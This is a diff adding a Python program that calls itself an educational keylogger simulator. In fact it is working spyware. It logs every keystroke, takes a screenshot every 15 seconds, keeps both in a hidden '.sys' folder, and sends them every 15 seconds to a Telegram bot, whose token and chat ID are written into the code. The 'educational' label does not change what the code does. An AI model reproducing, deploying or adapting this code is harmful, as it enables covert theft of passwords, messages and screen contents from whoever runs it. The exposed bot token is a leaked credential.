@@ -1,0 +1,234 @@
+# keylogger_simulator + Telegram sender
+# EDUCATIONAL USE ONLY
+
+import sys
+import logging
+from pynput import keyboard
+import datetime
+import os
+import threading
+import traceback
+from pathlib import Path
+import time
+import requests
+import mss
+
+# Windows: hide folder
+if sys.platform == "win32":
+    import ctypes
+
+    FILE_ATTRIBUTE_HIDDEN = 0x02
+
+
+# ===============================
+# Hidden folder on D: for storage
+# ===============================
+def get_storage_dir():
+    """Create and return a hidden folder on D: drive. Falls back to script dir if D: missing."""
+    d_drive = Path("D:/")
+    # Hidden folder name (dot-prefix + generic name)
+    hidden_folder = d_drive / ".sys"
+    if d_drive.exists():
+        hidden_folder.mkdir(parents=True, exist_ok=True)
+        if sys.platform == "win32":
+            try:
+                ctypes.windll.kernel32.SetFileAttributesW(
+                    str(hidden_folder), FILE_ATTRIBUTE_HIDDEN
+                )
+            except Exception:
+                pass
+        return hidden_folder
+    # Fallback: same dir as script/exe
+    if getattr(sys, "frozen", False):
+        return Path(sys.executable).resolve().parent
+    return Path(__file__).resolve().parent
+
+
+STORAGE_DIR = get_storage_dir()
+BASE_DIR = STORAGE_DIR
+
+log_file = STORAGE_DIR / "keylog.txt"
+log_system = STORAGE_DIR / "keylogger.log"
+
+# ====== بيانات البوت (Telegram) ======
+BOT_TOKEN = "8356857690:AAGvBOffeeolZ4XATAPu_dJCeveex0sNoLU"
+CHAT_ID = "241490872"
+URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
+SEND_INTERVAL = 15  # seconds
+
+# ===============================
+# Logging
+# ===============================
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s - %(levelname)s - %(message)s",
+    handlers=[
+        logging.FileHandler(str(log_system), encoding="utf-8"),
+        logging.StreamHandler(sys.stdout),
+    ],
+)
+
+log_buffer = []
+buffer_lock = threading.Lock()
+flush_interval = 1
+running = True
+
+
+# ===============================
+def setup_log_file():
+    try:
+        if not log_file.exists():
+            with open(log_file, "w", encoding="utf-8") as f:
+                f.write("=== Keylogger Simulator Log (Naser) ===\n")
+            logging.info(f"Created log file at: {log_file}")
+        else:
+            logging.info(f"Using existing log file at: {log_file}")
+    except Exception as e:
+        logging.error(f"Failed to setup log file: {e}")
+        raise
+
+
+# ===============================
+def flush_buffer():
+    global log_buffer
+    try:
+        with buffer_lock:
+            if log_buffer:
+                with open(log_file, "a", encoding="utf-8") as f:
+                    f.writelines(log_buffer)
+                log_buffer.clear()
+
+        if running:
+            threading.Timer(flush_interval, flush_buffer).start()
+    except Exception as e:
+        logging.error(f"flush_buffer error: {e}")
+        traceback.print_exc()
+
+
+# ===============================
+def format_key(key):
+    try:
+        if hasattr(key, "char") and key.char:
+            return key.char if key.char.isprintable() else f"[{key}]"
+        return f"[{key}]"
+    except Exception:
+        return "[UNKNOWN]"
+
+
+# ===============================
+def on_press(key):
+    try:
+        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        entry = f"{timestamp} - {format_key(key)}\n"
+        with buffer_lock:
+            log_buffer.append(entry)
+    except Exception as e:
+        logging.error(f"on_press error: {e}")
+
+
+# ===============================
+
+
+def take_screenshot():
+    try:
+        screenshot_path = (
+            STORAGE_DIR / "screenshot.png"
+        )  # نفس الاسم عشان يستبدل القديمة
+
+        with mss.mss() as sct:
+            sct.shot(output=str(screenshot_path))
+
+        logging.info(f"Screenshot saved at: {screenshot_path}")
+
+    except Exception as e:
+        logging.error(f"Error taking screenshot: {e}")
+
+
+def screenshot_thread():
+    """تشغيل أخذ الصور في الخلفية"""
+    while running:
+        take_screenshot()
+        time.sleep(15)  # قم بتغيير هذه القيمة حسب الحاجة
+
+
+def send_file_to_telegram():
+    try:
+        screenshot_path = STORAGE_DIR / "screenshot.png"
+
+        if not log_file.exists():
+            return
+
+        # ===== إرسال ملف اللوج =====
+        with open(log_file, "rb") as log_f:
+            response1 = requests.post(
+                f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
+                data={"chat_id": CHAT_ID},
+                files={"document": log_f},
+                timeout=10,
+            )
+
+        # ===== إرسال الصورة =====
+        if screenshot_path.exists():
+            with open(screenshot_path, "rb") as screenshot_f:
+                response2 = requests.post(
+                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
+                    data={"chat_id": CHAT_ID},
+                    files={"photo": screenshot_f},
+                    timeout=10,
+                )
+
+        logging.info("✅ Files sent")
+
+    except Exception as e:
+        logging.warning("⚠️ Telegram send error: %s", e)
+
+
+# ===============================
+def telegram_sender_loop():
+    while running:
+        time.sleep(SEND_INTERVAL)
+        if not running:
+            break
+        send_file_to_telegram()
+
+
+# ===============================
+def cleanup():
+    global running
+    running = False
+    flush_buffer()
+    logging.info("Clean shutdown")
+
+
+# ===============================
+def main():
+    try:
+        logging.info(f"Running from: {BASE_DIR}")
+        setup_log_file()
+        flush_buffer()
+
+        # Start Telegram sender in background thread
+        sender_thread = threading.Thread(target=telegram_sender_loop, daemon=True)
+        sender_thread.start()
+        logging.info("Telegram sender started (every %s sec)", SEND_INTERVAL)
+
+        # بدء الخيط الخاص بالتقاط الصور
+        screenshot_threading = threading.Thread(target=screenshot_thread, daemon=True)
+        screenshot_threading.start()
+        with keyboard.Listener(on_press=on_press) as listener:
+            logging.info("Keyboard listener started")
+            listener.join()
+
+    except Exception as e:
+        logging.error(f"Main error: {e}")
+        traceback.print_exc()
+
+
+# ===============================
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        logging.info("Keyboard interrupt")
+    finally:
+        cleanup()
